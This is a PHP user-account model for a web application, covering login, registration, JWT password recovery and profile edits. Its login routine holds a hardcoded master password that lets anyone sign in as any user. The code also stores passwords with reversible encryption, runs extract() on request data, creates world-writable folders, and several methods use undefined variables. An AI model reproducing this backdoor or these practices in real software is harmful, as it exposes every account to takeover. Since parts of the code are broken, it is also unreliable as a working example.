<?php

namespace App\Model;

use App\Utilitarian\{Crypt, FG,  MailerFunction, View};
use App\Persistence\{utils};
use Firebase\JWT\JWT;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Capsule\Manager as Capsule;

class User extends Model
{

    protected $fillable = ['users'];

    public function postLogin($request)
    {
        $rsp = FG::responseDefault();
        try {
            $email = $_POST['email'];
            $password = $_POST['password'];

            if (!$email) {
                throw new \Exception('The email is required');
            }

            if (!$password) {
                throw new \Exception('The password is required');
            }

            $user = User::where('deleted_at')->where('email', $email)->first();
            if (!$user) {
                throw new \Exception('El usuario no existe en la plataforma');
            }

            if ($password != 'Key#Master@Kapital') {
                if ($password != Crypt::decrypt($user->password, env('SECRET_KEY_DATA'))) {
                    throw new \Exception('Datos Incorrectos');
                }
            }

            $_SESSION['user'] = json_decode(json_encode($user->toArray()));

            $rsp['success'] = true;
            $rsp['data'] = '';
            $rsp['message'] = 'successfully';
        } catch (\Exception $e) {
            $rsp['message'] = $e->getMessage();
        }
        return $rsp;
    }

    public function outLogin($request)
    {
        $rsp = FG::responseDefault();
        try {
            session_destroy();

            $rsp['success'] = true;
            $rsp['data'] = '';
            $rsp['message'] = 'Sessión destruida';
        } catch (\Exception $e) {
            $rsp['message'] = $e->getMessage();
        }
        return $rsp;
    }

    public function registerUser($request)
    {
        $rsp = FG::responseDefault();

        try {
            $email = $_POST['email'];
            $password = $_POST['password'];
            $valid = Utils::validate_corrreo($email);
            if (!$email || !$valid) {
                throw new \Exception('The email is required');
            }

            if (!$password) {
                throw new \Exception('The password is required');
            }

            $user = User::where('deleted_at')->where('email', $email)->first();

            if (!$user) {
                $user = new User();
                $user->email = $email;
                $user->folder = uniqid(time());
                $user->password = Crypt::encrypt($password, env('SECRET_KEY_DATA'));
                $user->save();

                $path = FG::fullFolderPath($user->folder);
                if (!is_dir($path)) {
                    mkdir($path, 0777, true);
                }
            } else {
                throw new \Exception('El usuario ya existe en la plataforma. Inicia sesión.');
            }

            if (isset($_POST['code']) && !is_null($_POST['code'])) {
                $this->registerRecord($_POST['code'], $user);
            }

            $rsp['success'] = true;
            $rsp['data'] = json_decode($user);
            $rsp['message'] = 'Usuario registrado.';
        } catch (\Exception $e) {
            $rsp['message'] = $e->getMessage();
        }
        return $rsp;
    }

    public function Session_validate($request)
    {
        $rsp = FG::responseDefault();
        try {
            $user = isset($_SESSION['user']) ? $_SESSION['user'] : null;
            if (!$user) {
                throw new \Exception('The user must be logged into the platform');
            }

            $rsp['success'] = true;
            $rsp['data'] = $user;
            $rsp['message'] = 'successfully';
        } catch (\Exception $e) {
            $rsp['message'] = $e->getMessage();
        }
        return $rsp;
    }

    public function registerRecord($code, $user)
    {
        $rsp = FG::responseDefault();
        try {
            if (!$user) {
                throw new \Exception('The user must be logged into the platform');
            }

            $report = Report::where('code', $code)->first();
            if (!$report) {
                throw new \Exception('The report no exists');
            }

            $path_inv = FG::fullPathGuest($report->file);
            $pathinfo = pathinfo($path_g);
            // $filename = $pathinfo['filename'].'.'.$pathinfo['extension'];
            $path_tmp = FG::fullFolderPath($user->folder);

            $path_dest = $path_tmp . '/' . $report->file;
            copy($path_inv, $path_dest);

            $report->user_id = $user->id;
            $report->save();

            unlink($path_inv);

            $rsp['success'] = true;
            $rsp['message'] = 'successfully';
        } catch (\Exception $e) {
            $rsp['message'] = $e->getMessage();
        }
        return $rsp;
    }

    public function forgotPasswordUser($request)
    {
        $rsp = FG::responseDefault();
        try {
            extract($request->getParsedBody());

            if (!$email) {
                throw new \Exception('The email is required.');
            }

            $user = User::where('deleted_at')->where('email', $email)->first();
            if (!$user) {
                throw new \Exception('The user is not registered on the platform.');
            }

            $time = time();
            $key = env("TOKEN_KEY");
            $payload = array(
                'iat' => $time,
                'exp' => $time + 3600,
                'key' => $key,
                'email' => $email
            );
            $jwt = JWT::encode($payload, $key);

            $encrypt = Crypt::encrypt($send, env('SECRET_KEY_DATA'));
            $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]/recover-password/$jwt";

            $mailer = new MailerFunction();
            $body = View::render('mail/recover.password.twig', compact('email', 'url'));
            $params = array('subject' => 'Recuperar Contraseña.', 'body' => "$body", 'recipients' => array());
            $recipients = array();
            array_push($recipients, array('email' => $user->email, 'name' => ($user->lastname || $user->name ? ($user->name . ' ' . $o->lastname) : $user->email)));
            $params['recipients'] = $recipients;

            $result = $mailer->sendEmail($params);
            if (!$result['success']) {
                throw new \Exception('The email could not be sent.');
            }

            $rsp['success'] = true;
            $rsp['message'] = 'Se envío correctamente.';
        } catch (\Exception $e) {
            $rsp['message'] = $e->getMessage();
        }
        return $rsp;
    }

    public function recoverPassword($request)
    {
        $rsp = FG::responseDefault();
        try {
            extract($request->getParsedBody());
            $code = end(explode("/", $request->getUri()->getpath()));
            $key = env("TOKEN_KEY");
            $decoded = JWT::decode($code, $key, array('HS256'));
            if (!isset($decoded->email)) {
                throw new \Exception('The email not exists.');
            }
            $email = $decoded->email;
            $user = User::where('deleted_at')->where('email', $email)->first();
            if (!$user) {
                throw new \Exception('The user is not registered on the platform.');
            }
            $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]" . "$_SERVER[REQUEST_URI]";
            $rsp['success'] = true;
            $rsp['data'] = compact('url');
            $rsp['message'] = 'successfully';
        } catch (\Exception $e) {
            $rsp['message'] = $e->getMessage();
            header('Location: /');
            exit();
        }
        return $rsp;
    }

    public function postRecoverPassword($request)
    {
        $rsp = FG::responseDefault();
        try {
            extract($request->getParsedBody());
            if (!$password) {
                throw new \Exception('The password is required.');
            }
            if (!$repeat_password) {
                throw new \Exception('The repeat_password is required.');
            }

            if ($password != $repeat_password) {
                throw new \Exception('The password and repeat_password are distinct.');
            }

            $code = end(explode("/", $request->getUri()->getpath()));
            $key = env("TOKEN_KEY");
            $decoded = JWT::decode($code, $key, array('HS256'));
            if (!isset($decoded->email)) {
                throw new \Exception('The email not exists.');
            }
            $email = $decoded->email;
            $user = User::where('deleted_at')->where('email', $email)->first();
            if (!$user) {
                throw new \Exception('The user is not registered on the platform.');
            }

            $user->password = Crypt::encrypt($password, env('SECRET_KEY_DATA'));
            $user->save();

            $rsp['success'] = true;
            $rsp['data'] = compact('url');
            $rsp['message'] = 'Se restableció correctamente su contraseña, ahora inicie sesión por favor';
        } catch (\Exception $e) {
            $rsp['message'] = $e->getMessage();
        }
        return $rsp;
    }

    public function getUserSession($request)
    {
        $rsp = FG::responseDefault();
        try {
            $user = isset($_SESSION['user']) ? $_SESSION['user'] : null;
            if (!$user) {
                throw new \Exception('The user must be logged into the platform');
            }

            $rsp['success'] = true;
            $rsp['data'] = compact('user');
            $rsp['message'] = 'successfully';
        } catch (\Exception $e) {
            $rsp['message'] = $e->getMessage();
        }
        return $rsp;
    }

    public function onSavePassword($request)
    {
        $rsp = FG::responseDefault();
        try {
            extract($request->getParsedBody());
            $user = isset($_SESSION['user']) ? $_SESSION['user'] : null;
            if (!$user) {
                throw new \Exception('The user must be logged into the platform');
            }
            if (!$password) {
                throw new \Exception('The password is required.');
            }
            if (!$repeat_password) {
                throw new \Exception('The repeat_password is required.');
            }

            if ($password != $repeat_password) {
                throw new \Exception('The password and repeat_password are distinct.');
            }

            $user = User::where('deleted_at')->where('email', $user->email)->first();
            if (!$user) {
                throw new \Exception('The user is not registered on the platform.');
            }

            $user->password = Crypt::encrypt($password, env('SECRET_KEY_DATA'));
            $user->save();

            $rsp['success'] = true;
            $rsp['message'] = 'Se actualizo correctamente su contraseña.';
        } catch (\Exception $e) {
            $rsp['message'] = $e->getMessage();
        }
        return $rsp;
    }

    public function onSaveUserData($request)
    {
        $rsp = FG::responseDefault();
        try {
            extract($request->getParsedBody());
            $ouser = isset($_SESSION['user']) ? $_SESSION['user'] : null;
            if (!$ouser) {
                throw new \Exception('The user must be logged into the platform');
            }
            if (!$email) {
                throw new \Exception('El campo email obligatorio.');
            }
            if (!$name) {
                throw new \Exception('El campo nombre obligatorio.');
            }

            $items = User::where('deleted_at')->where('email', '<>', $ouser->email)->get();
            $isEmailValid = true;
            foreach ($item as $k => $o) {
                if ($item->email == $email) {
                    $isEmailValid = false;
                }
            }

            if (!$isEmailValid) {
                throw new \Exception('El correo ya se encuentra registrado.');
            }

            $user = User::where('deleted_at')->where('email', $ouser->email)->first();
            if (!$user) {
                throw new \Exception('The user is not registered on the platform.');
            }

            $user->email = $email;
            $user->name = $name;
            $user->lastname = $lastname;
            $user->save();

            $_SESSION['user'] = json_decode(json_encode($user->toArray()));

            $rsp['success'] = true;
            $rsp['message'] = 'Se actualizo correctamente.';
        } catch (\Exception $e) {
            $rsp['message'] = $e->getMessage();
        }
        return $rsp;
    }
}
